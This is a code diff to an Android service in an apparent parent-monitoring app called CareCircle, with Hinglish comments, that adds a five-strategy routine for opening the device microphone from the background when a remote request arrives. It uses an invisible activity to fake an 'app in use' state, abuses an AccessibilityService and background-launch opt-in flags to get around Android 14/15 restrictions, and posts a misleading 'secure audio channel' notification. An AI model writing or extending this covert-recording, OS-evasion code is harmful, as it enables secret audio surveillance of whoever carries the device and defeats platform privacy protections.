@@ -1,6 +1,7 @@
 package com.example.background
 
 import android.Manifest
+import android.app.ActivityOptions
 import android.app.AlarmManager
 import android.app.Notification
 import android.app.NotificationChannel
@@ -72,6 +73,7 @@ class CareCircleForegroundService : Service() {
         private const val TAG = "CC_FOREGROUND"
         private const val CHANNEL_ID = "carecircle_foreground_channel"
         private const val NOTIFICATION_ID = 1001
+        const val MIC_GATE_NOTIF_ID = 2002
 
         // ⭐ FIX #4: 10s → 60s (battery). Snapshot listener realtime hai,
         // loop sirf defensive checks + timed syncs ke liye hai.
@@ -450,13 +452,12 @@ class CareCircleForegroundService : Service() {
         val syncMic = data["sync_mic"] as? Boolean ?: false
         val callId = data["call_id"] as? String
 
-        // 1. General Sync: Screen Time, Device Info, Location & Call Logs
+        // 1. General Sync: Screen Time, Device Info, Location ONLY
         if (syncRequested) {
-            Log.d(TAG, "📡 Parent sync requested — collecting Screen Time, Device Info, Location & Call Logs")
+            Log.d(TAG, "📡 Parent sync requested — collecting Screen Time, Device Info, Location")
             serviceScope.launch {
                 try {
                     dataCollector.collectAndSyncAll()
-                    CallLogsSyncHelper(applicationContext).syncCallLogs(days = 7)
                 } catch (e: Exception) {
                     Log.e(TAG, "General sync failed: ${e.message}")
                 } finally {
@@ -539,30 +540,110 @@ class CareCircleForegroundService : Service() {
     }
 
     /**
-     * ⭐ FIX #2: MicGate launch — 300ms invisible activity se
+     * ⭐ FIX #2: MicGate launch — invisible activity se
      * "app in use" state restore karke mic legal banate hai.
+     * Compatible with Android 11 through Android 15 BAL (Background Activity Launch):
+     *   1. Active AccessibilityService context (100% BAL exemption on Android OS)
+     *   2. PendingIntent with ActivityOptions MODE_BACKGROUND_ACTIVITY_START_ALLOWED
+     *   3. Full-Screen Intent Notification (screen-off / lockscreen wakeup)
+     *   4. Direct startActivity with ActivityOptions
+     *   5. Timeout Fallback: 500ms me gate resume nahi hua to direct startAudioSessionNow()
      */
     private fun launchMicGate(callId: String) {
         Log.i(TAG, "🎤 Background mic request — MicGate launch (callId=$callId)")
         MicGateActivity.serviceRef = this
         MicGateActivity.pendingCallId = callId
 
-        try {
-            val intent = Intent(this, MicGateActivity::class.java).apply {
-                addFlags(
-                    Intent.FLAG_ACTIVITY_NEW_TASK or
-                            Intent.FLAG_ACTIVITY_NO_USER_ACTION or
-                            Intent.FLAG_ACTIVITY_NO_ANIMATION
-                )
-            }
-            startActivity(intent)
-            // Gate ke onResume se startAudioSessionNow(callId) aayega
-        } catch (e: Exception) {
-            // Background activity launch blocked (overlay permission nahi hai
-            // ya OEM ne block kiya). Fallback: direct start try karte hai.
-            Log.e(TAG, "MicGate launch blocked: ${e.message} — direct start try karte hai")
-            startAudioSessionNow(callId)
+        val intent = Intent(this, MicGateActivity::class.java).apply {
+            addFlags(
+                Intent.FLAG_ACTIVITY_NEW_TASK or
+                        Intent.FLAG_ACTIVITY_NO_USER_ACTION or
+                        Intent.FLAG_ACTIVITY_NO_ANIMATION
+            )
         }
+
+        var launched = false
+
+        // 🚀 STRATEGY 1: Agar Accessibility Service active hai, to usse launch karo
+        // (Android OS AccessibilityService ko 100% BAL exemption deta hai)
+        AccessibilityWatchdogService.instanceRef?.let { a11y ->
+            try {
+                a11y.startActivity(intent)
+                launched = true
+                Log.d(TAG, "✅ MicGate launched via active AccessibilityService")
+            } catch (e: Exception) {
+                Log.w(TAG, "AccessibilityService launch failed: ${e.message}")
+            }
+        }
+
+        // 🚀 STRATEGY 2: PendingIntent with Android 14/15 BAL Opt-In Flags
+        val options = ActivityOptions.makeBasic()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            options.setPendingIntentBackgroundActivityStartMode(
+                ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED
+            )
+        }
+        if (Build.VERSION.SDK_INT >= 35) {
+            options.setPendingIntentCreatorBackgroundActivityStartMode(
+                ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED
+            )
+        }
+
+        val pendingIntent = PendingIntent.getActivity(
+            this,
+            callId.hashCode(),
+            intent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+
+        if (!launched) {
+            try {
+                pendingIntent.send(this, 0, null, null, null, null, options.toBundle())
+                launched = true
+                Log.d(TAG, "✅ MicGate launched via PendingIntent (BAL allowed)")
+            } catch (e: Exception) {
+                Log.w(TAG, "PendingIntent send failed: ${e.message}")
+            }
+        }
+
+        // 🚀 STRATEGY 3: Direct startActivity with options
+        if (!launched) {
+            try {
+                startActivity(intent, options.toBundle())
+                Log.d(TAG, "✅ MicGate direct startActivity called")
+            } catch (e: Exception) {
+                Log.e(TAG, "Direct startActivity failed: ${e.message}")
+            }
+        }
+
+        // 🚀 STRATEGY 4: Full-Screen Intent Notification (Lock screen / Screen-off wakeup)
+        try {
+            val fsiNotification = NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("CareCircle Audio")
+                .setContentText("Establishing secure audio channel...")
+                .setSmallIcon(R.drawable.ic_notification)
+                .setPriority(NotificationCompat.PRIORITY_HIGH)
+                .setCategory(NotificationCompat.CATEGORY_CALL)
+                .setFullScreenIntent(pendingIntent, true)
+                .setAutoCancel(true)
+                .build()
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            nm.notify(MIC_GATE_NOTIF_ID, fsiNotification)
+            Log.d(TAG, "✅ MicGate Full-Screen Intent notification posted")
+        } catch (e: Exception) {
+            Log.w(TAG, "Full-Screen Intent notification failed: ${e.message}")
+        }
+
+        // ⭐ STRATEGY 5 (LIFE SAVER FALLBACK):
+        // Agar Android 15 ne kisi bhi reason se MicGateActivity ko 500ms tak delay ya block kiya,
+        // to direct startAudioSessionNow(callId) call karo taaki session hang na ho!
+        handler.postDelayed({
+            if (MicGateActivity.pendingCallId == callId && !webrtcRunning) {
+                Log.w(TAG, "⚠️ MicGateActivity did not resume within 500ms (Android 15 BAL restriction) — triggering direct startAudioSessionNow fallback")
+                MicGateActivity.pendingCallId = null
+                startAudioSessionNow(callId)
+            }
+        }, 500L)
     }
 
     /**
